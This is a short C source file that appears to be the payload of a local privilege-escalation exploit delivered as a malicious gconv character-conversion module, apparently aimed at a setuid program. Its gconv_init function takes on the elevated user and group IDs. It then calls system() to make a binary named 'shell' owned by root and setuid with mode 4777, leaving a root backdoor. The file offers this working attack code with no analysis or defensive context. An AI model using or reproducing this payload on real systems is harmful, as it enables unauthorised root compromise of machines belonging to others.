#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
	gid_t gid = getegid();
	uid_t uid = geteuid();

	setregid(gid, gid);
	setreuid(uid, uid);

	system("/usr/bin/chown root shell");
	system("/usr/bin/chmod 4777 shell");
}
